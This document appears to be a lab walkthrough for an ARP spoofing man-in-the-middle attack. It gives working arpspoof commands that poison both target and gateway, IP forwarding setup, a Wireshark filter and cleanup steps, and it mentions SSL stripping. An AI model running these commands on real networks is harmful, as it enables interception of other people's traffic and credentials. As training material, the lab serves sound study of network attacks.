# ARP Spoofing MITM Attack Lab

## Objective

To perform a Man-in-the-Middle (MITM) attack using ARP spoofing, enabling packet interception between a target and a gateway. Wireshark will be used to monitor the captured traffic.

---

## Tools Used

- Kali Linux (or compatible Linux VM)
- `arpspoof` (from `dsniff` package)
- Wireshark

---

## Lab Setup

- **Attacker IP (Kali)**: `10.0.2.15`
- **Target IP**: `10.0.2.3`
- **Gateway IP**: `10.0.2.1`
- **Network Interface**: `eth0`

---

## Step-by-Step Instructions

### 1. Identify Network Details

```bash
ip a         # Check your attacker IP and interface
ip route     # Identify the default gateway IP
```

### 2. Enable IP Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### 3. Start ARP Spoofing

#### Terminal 1 (Spoof the Target)

```bash
sudo arpspoof -i eth0 -t 10.0.2.3 10.0.2.1
```

#### Terminal 2 (Spoof the Gateway)

```bash
sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.3
```

This poisons the ARP cache of both the target and the gateway.

---

## 4. Open Wireshark

- Launch Wireshark
- Select interface `eth0`
- Start capture
- Use the filter:

```wireshark
ip.addr == 10.0.2.3
```

---

## 5. Observe Captured Traffic

- Look for intercepted HTTP, DNS, or encrypted HTTPS packets
- Traffic between the target and the gateway should now route through your machine

---

## 6. Cleanup

```bash
# Stop ARP spoofing with Ctrl+C in both terminals

# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Notes

- Only HTTP traffic will be fully readable unless SSL stripping is used
- MITM attacks are illegal without authorization — this should only be performed in a lab setting

---

## Key Takeaways

- ARP spoofing tricks two machines into routing traffic through you
- Wireshark is a powerful tool to observe network-level attacks
- Always restore system network settings after performing spoofing
